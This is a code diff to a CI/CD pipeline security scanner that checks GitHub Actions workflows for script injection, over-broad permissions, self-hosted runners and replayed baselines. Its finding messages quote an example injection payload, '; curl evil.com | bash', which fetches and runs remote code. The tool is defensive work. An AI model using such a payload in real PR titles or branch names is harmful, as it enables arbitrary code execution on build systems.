@@ -51,6 +51,12 @@ _IGNORE_VARS: frozenset[str] = frozenset({
     "RUNNER_TEMP", "RUNNER_WORKSPACE", "GITHUB_WORKSPACE",
     "HOME", "TMPDIR", "TMP", "TEMP", "PWD", "_", "TERM", "SHLVL", "OLDPWD",
 })
+# Env var names matching this pattern are excluded from snapshots to prevent
+# writing credentials (tokens, keys, passwords) to disk or the cache store.
+_CREDENTIAL_VAR_RE = re.compile(
+    r"(token|secret|key|password|passwd|pwd|auth|credential|private|api_key)",
+    re.IGNORECASE,
+)
 _SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
 _ANSI = {
     "HIGH": "\033[91m", "CRITICAL": "\033[91m", "MEDIUM": "\033[93m",
@@ -180,7 +186,7 @@ def _hash_content(content) -> str:
     return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()[:16]
 
 
-def _fingerprints(workflow_path: str, content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
+def _fingerprints(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
     """GitHub Actions: {(job, step_index): (step_name, fingerprint)}"""
     try:
         doc = yaml.safe_load(content)
@@ -254,7 +260,7 @@ def _fps_for_file(fpath: Path, rel: str, content: str) -> dict:
         return _fingerprints_jenkinsfile(content)
     if fpath.name in (".gitlab-ci.yml", ".gitlab-ci.yaml"):
         return _fingerprints_gitlab(content)
-    return _fingerprints(rel, content)
+    return _fingerprints(content)
 
 
 def diff_fingerprints(repo: Path, baseline: str) -> list[StepChange]:
@@ -280,15 +286,20 @@ def diff_fingerprints(repo: Path, baseline: str) -> list[StepChange]:
 # ── static analysis ───────────────────────────────────────────────────────────
 
 def _load_workflow_docs(repo: Path) -> dict[str, dict]:
-    """Load all GitHub Actions workflow files → {rel_path: parsed_doc}"""
+    """Load all GitHub Actions workflow files → {rel_path: parsed_doc}
+
+    Both glob patterns are collected before iterating so that a file with an
+    unusual double extension (if it ever appeared) would simply overwrite its
+    first entry — the last parse wins, which is fine for our purposes.
+    A file can only match one extension pattern, so duplicates cannot arise in
+    practice; the combined list is safe to iterate without a duplicate guard.
+    """
     docs = {}
     wf_dir = repo / ".github" / "workflows"
     if not wf_dir.exists():
         return docs
     for fpath in list(wf_dir.glob("*.yml")) + list(wf_dir.glob("*.yaml")):
         rel = str(fpath.relative_to(repo))
-        if rel in docs:
-            continue
         try:
             doc = yaml.safe_load(fpath.read_text(encoding="utf-8", errors="replace"))
             if isinstance(doc, dict):
@@ -311,7 +322,8 @@ def _get_triggers(doc: dict) -> dict:
 def _check_pr_target_misuse(docs: dict[str, dict]) -> list[dict]:
     """Flag pull_request_target workflows that check out and execute PR head code."""
     findings = []
-    checkout_re = re.compile(r"actions/checkout(@.*)?")
+    # Anchor with $ so this doesn't match actions/checkout-something-else.
+    checkout_re = re.compile(r"actions/checkout(@[^@]+)?$")
     pr_head_re = re.compile(r"github\.event\.pull_request\.head|github\.head_ref", re.IGNORECASE)
     for path, doc in docs.items():
         if "pull_request_target" not in _get_triggers(doc):
@@ -340,28 +352,57 @@ def _check_pr_target_misuse(docs: dict[str, dict]) -> list[dict]:
 
 
 def _check_script_injection(docs: dict[str, dict]) -> list[dict]:
-    """Flag run: blocks interpolating untrusted user-controlled context values."""
+    """Flag run: blocks and env: blocks that route untrusted user-controlled context values
+    into shell commands.  The env: vector is classic: set an env var from a user-controlled
+    context value, then expand $VAR inside the run: block — no ${{ }} in the run: block
+    itself, but still fully attacker-controlled.
+    """
     findings = []
     for path, doc in docs.items():
         for job_name, job_def in (doc.get("jobs") or {}).items():
             if not isinstance(job_def, dict):
                 continue
             for idx, step in enumerate(job_def.get("steps") or []):
-                if not isinstance(step, dict) or "run" not in step:
+                if not isinstance(step, dict):
                     continue
-                run_block = str(step["run"])
-                matches = _DANGEROUS_CTX.findall(run_block)
-                if matches:
-                    findings.append(_finding(
-                        f"PW-INJ-{len(findings)+1:03d}", "HIGH",
-                        "script_injection",
-                        f"Script injection risk: {path}::{job_name}::step[{idx}]",
-                        "A run: block interpolates a user-controlled context value directly into "
-                        "a shell command. An attacker can craft a PR title, issue body, or branch "
-                        "name containing `; curl evil.com | bash` to execute arbitrary code.",
-                        f"{path}::{job_name}::step[{idx}]",
-                        f"dangerous expressions found: {sorted(set(m[0] if isinstance(m, tuple) else m for m in matches))}",
-                    ))
+
+                # Check run: block for direct context interpolation.
+                run_matches: list = []
+                if "run" in step:
+                    run_matches = _DANGEROUS_CTX.findall(str(step["run"]))
+
+                # Check env: block — user-controlled value bound to an env var
+                # that the run: block may then expand via $VAR / %VAR%.
+                env_matches: list = []
+                env_block = step.get("env")
+                if isinstance(env_block, dict):
+                    env_matches = _DANGEROUS_CTX.findall(json.dumps(env_block))
+
+                all_matches = run_matches + env_matches
+                if not all_matches:
+                    continue
+
+                sources = sorted(set(
+                    m[0] if isinstance(m, tuple) else m for m in all_matches
+                ))
+                vectors = []
+                if run_matches:
+                    vectors.append("run:")
+                if env_matches:
+                    vectors.append("env: (routed to shell via environment variable)")
+
+                findings.append(_finding(
+                    f"PW-INJ-{len(findings)+1:03d}", "HIGH",
+                    "script_injection",
+                    f"Script injection risk: {path}::{job_name}::step[{idx}]",
+                    "A user-controlled context value is interpolated into a shell command "
+                    "(directly in run: or via an env: variable). An attacker can craft a "
+                    "PR title, issue body, or branch name containing "
+                    "`; curl evil.com | bash` to execute arbitrary code. "
+                    f"Injection vector(s): {', '.join(vectors)}",
+                    f"{path}::{job_name}::step[{idx}]",
+                    f"dangerous expressions found: {sources}",
+                ))
     return findings
 
 
@@ -393,7 +434,8 @@ def _check_permissions(docs: dict[str, dict]) -> list[dict]:
         for job_name, job_def in (doc.get("jobs") or {}).items():
             if not isinstance(job_def, dict):
                 continue
-            if job_def.get("permissions") == "write-all":
+            job_perms = job_def.get("permissions")
+            if job_perms == "write-all":
                 findings.append(_finding(
                     f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                     "permissions",
@@ -401,6 +443,18 @@ def _check_permissions(docs: dict[str, dict]) -> list[dict]:
                     f"Job '{job_name}' has permissions: write-all.",
                     f"{path}::{job_name}",
                 ))
+            elif isinstance(job_perms, dict):
+                write_scopes = [k for k, v in job_perms.items() if v in ("write", "admin")]
+                if write_scopes:
+                    findings.append(_finding(
+                        f"PW-PERM-{len(findings)+1:03d}", "HIGH",
+                        "permissions",
+                        f"Job has write-scoped permissions: {path}::{job_name}",
+                        f"Job '{job_name}' grants write access to: {write_scopes}. "
+                        "Scope each permission to the minimum the job actually needs.",
+                        f"{path}::{job_name}",
+                        f"write scopes: {write_scopes}",
+                    ))
             if job_def.get("secrets") == "inherit":
                 findings.append(_finding(
                     f"PW-PERM-{len(findings)+1:03d}", "MEDIUM",
@@ -415,6 +469,8 @@ def _check_permissions(docs: dict[str, dict]) -> list[dict]:
 
 def _check_self_hosted(docs: dict[str, dict]) -> list[dict]:
     """Flag jobs running on self-hosted runners."""
+    _EXPR_RE = re.compile(r"\$\{\{")  # expression syntax — can't be statically resolved
+
     findings = []
     for path, doc in docs.items():
         for job_name, job_def in (doc.get("jobs") or {}).items():
@@ -423,10 +479,17 @@ def _check_self_hosted(docs: dict[str, dict]) -> list[dict]:
             runs_on = job_def.get("runs-on", "")
             is_self_hosted = False
             if isinstance(runs_on, list):
+                # Skip lists that contain expression elements — matrix builds,
+                # dynamic runner selection, etc. can't be resolved statically.
+                if any(_EXPR_RE.search(str(r)) for r in runs_on):
+                    continue
                 is_self_hosted = "self-hosted" in runs_on or any(
                     not _GH_HOSTED.match(str(r)) for r in runs_on if isinstance(r, str)
                 )
             elif isinstance(runs_on, str) and runs_on:
+                # Skip expression-based values like ${{ matrix.os }} or ${{ inputs.runner }}.
+                if _EXPR_RE.search(runs_on):
+                    continue
                 is_self_hosted = not _GH_HOSTED.match(runs_on)
             if is_self_hosted:
                 findings.append(_finding(
@@ -460,12 +523,31 @@ def _check_workflow_run_chains(docs: dict[str, dict]) -> list[dict]:
         wr_config = triggers.get("workflow_run") or {}
         triggered_by = wr_config.get("workflows", []) if isinstance(wr_config, dict) else []
 
+        def _perms_has_write(perms) -> bool:
+            return (
+                perms == "write-all"
+                or (isinstance(perms, dict)
+                    and any(v in ("write", "admin") for v in perms.values()))
+            )
+
         top_perms = doc.get("permissions")
-        has_write = (
-            top_perms == "write-all"
-            or (isinstance(top_perms, dict)
-                and any(v in ("write", "admin") for v in top_perms.values()))
-        )
+        workflow_has_write = _perms_has_write(top_perms)
+
+        # Collect job names that have write access — either inherited from a
+        # write-permissioned top-level block or explicitly set at the job level.
+        write_jobs: list[str] = []
+        for job_name, job_def in (doc.get("jobs") or {}).items():
+            if not isinstance(job_def, dict):
+                continue
+            job_perms = job_def.get("permissions")
+            if job_perms is None:
+                # Inherits top-level — flagged if top-level is write
+                if workflow_has_write:
+                    write_jobs.append(job_name)
+            elif _perms_has_write(job_perms):
+                write_jobs.append(job_name)
+
+        has_write = bool(write_jobs) or (workflow_has_write and not doc.get("jobs"))
 
         for source_name in triggered_by:
             source_triggers = name_to_triggers.get(source_name, set())
@@ -480,7 +562,8 @@ def _check_workflow_run_chains(docs: dict[str, dict]) -> list[dict]:
                     "This workflow has write permissions, creating a privilege escalation path: "
                     "a PR from an untrusted fork can indirectly trigger write-permissioned code.",
                     path,
-                    f"source={source_name}  source_triggers={sorted(unsafe)}",
+                    f"source={source_name}  source_triggers={sorted(unsafe)}  "
+                    f"write_jobs={write_jobs or ['(top-level)']}",
                 ))
     return findings
 
@@ -568,9 +651,14 @@ def verify_pinned_shas(repo: Path, token: Optional[str] = None) -> list[dict]:
     """
     For each SHA-pinned action, verify the commit exists in that repo via GitHub API.
     Opt-in: pass --verify-shas. Rate limit: 60 req/hr unauthenticated, 5000 with --token.
+
+    API calls are deduplicated (one call per unique owner/repo+SHA pair), but a finding
+    is emitted for *every* affected step so callers see the full blast radius of a
+    compromised or deleted commit.
     """
     findings = []
-    seen: set[tuple[str, str]] = set()
+    # Cache API results: (owner/repo, sha) → bool (True = exists / inconclusive)
+    verified: dict[tuple[str, str], bool] = {}
 
     for fpath in find_pipeline_files(repo):
         if fpath.suffix not in (".yml", ".yaml"):
@@ -598,10 +686,9 @@ def verify_pinned_shas(repo: Path, token: Optional[str] = None) -> list[dict]:
                     continue
                 owner, repo_name = parts[0], parts[1]
                 key = (f"{owner}/{repo_name}", sha)
-                if key in seen:
-                    continue
-                seen.add(key)
-                if not _verify_commit_exists(owner, repo_name, sha, token):
+                if key not in verified:
+                    verified[key] = _verify_commit_exists(owner, repo_name, sha, token)
+                if not verified[key]:
                     findings.append(_finding(
                         f"PW-SHA-{len(findings)+1:03d}", "HIGH",
                         "invalid_pinned_sha",
@@ -650,7 +737,10 @@ def _tool_version(tool: str) -> Optional[str]:
 def capture_snapshot() -> EnvSnapshot:
     return EnvSnapshot(
         timestamp=datetime.now(timezone.utc).isoformat(),
-        environment={k: v for k, v in os.environ.items() if k not in _IGNORE_VARS},
+        environment={
+            k: v for k, v in os.environ.items()
+            if k not in _IGNORE_VARS and not _CREDENTIAL_VAR_RE.search(k)
+        },
         tool_versions={t: _tool_version(t) for t in _TRACKED_TOOLS},
     )
 
@@ -687,21 +777,24 @@ def diff_snapshots(base: EnvSnapshot, cur: EnvSnapshot) -> EnvDiff:
 
 # ── tamper-evident baseline ───────────────────────────────────────────────────
 
-def _hmac_sign(commit: str, key: str) -> str:
-    return _hmac_mod.new(key.encode(), commit.encode(), hashlib.sha256).hexdigest()
+def _hmac_sign(commit: str, timestamp: str, key: str) -> str:
+    """Sign commit+timestamp together so replaying an older valid baseline is detected."""
+    msg = f"{commit}\n{timestamp}".encode()
+    return _hmac_mod.new(key.encode(), msg, hashlib.sha256).hexdigest()
 
 
-def _hmac_verify(commit: str, signature: str, key: str) -> bool:
-    return _hmac_mod.compare_digest(_hmac_sign(commit, key), signature)
+def _hmac_verify(commit: str, timestamp: str, signature: str, key: str) -> bool:
+    return _hmac_mod.compare_digest(_hmac_sign(commit, timestamp, key), signature)
 
 
 def save_baseline(repo: Path, commit: str) -> None:
     key = os.environ.get("PIPEWATCH_HMAC_KEY")
     if key:
+        ts = datetime.now(timezone.utc).isoformat()
         data = {
             "commit": commit,
-            "timestamp": datetime.now(timezone.utc).isoformat(),
-            "hmac": _hmac_sign(commit, key),
+            "timestamp": ts,
+            "hmac": _hmac_sign(commit, ts, key),
         }
         (repo / _BASELINE_FILE).write_text(json.dumps(data) + "\n", encoding="utf-8")
     else:
@@ -719,14 +812,26 @@ def load_baseline(repo: Path, override: Optional[str]) -> str:
         data = json.loads(content)
         commit = data["commit"]
         key = os.environ.get("PIPEWATCH_HMAC_KEY")
-        if key and not _hmac_verify(commit, data.get("hmac", ""), key):
-            sys.exit(
-                "error: baseline HMAC verification failed — "
-                "the baseline file may have been tampered with."
-            )
+        if key:
+            ts = data.get("timestamp", "")
+            if not _hmac_verify(commit, ts, data.get("hmac", ""), key):
+                sys.exit(
+                    "error: baseline HMAC verification failed — "
+                    "the baseline file may have been tampered with or replayed "
+                    "from an older baseline."
+                )
         return commit
     except (json.JSONDecodeError, KeyError):
-        return content  # plain text format (backward compat)
+        # Plain-text format (backward compat) — refuse if signing is configured,
+        # because an attacker could have replaced a signed JSON baseline with a
+        # raw SHA to bypass HMAC verification entirely.
+        if os.environ.get("PIPEWATCH_HMAC_KEY"):
+            sys.exit(
+                "error: PIPEWATCH_HMAC_KEY is set but the baseline file is not in "
+                "signed JSON format — refusing to proceed. Re-run `pipewatch baseline` "
+                "with the key set to create a fresh signed baseline."
+            )
+        return content  # unsigned plain-text baseline accepted only when no key is configured
 
 
 # ── report ────────────────────────────────────────────────────────────────────
@@ -843,7 +948,10 @@ def print_report(report: dict, verbose: bool = False) -> None:
         print()
     s = report["summary"]
     print("─" * 60)
-    print(f"total={s['total']}  HIGH={s['HIGH']}  MEDIUM={s['MEDIUM']}  LOW={s['LOW']}\n")
+    print(
+        f"total={s['total']}  CRITICAL={s['CRITICAL']}  HIGH={s['HIGH']}  "
+        f"MEDIUM={s['MEDIUM']}  LOW={s['LOW']}  INFO={s['INFO']}\n"
+    )
 
 
 # ── CLI ───────────────────────────────────────────────────────────────────────
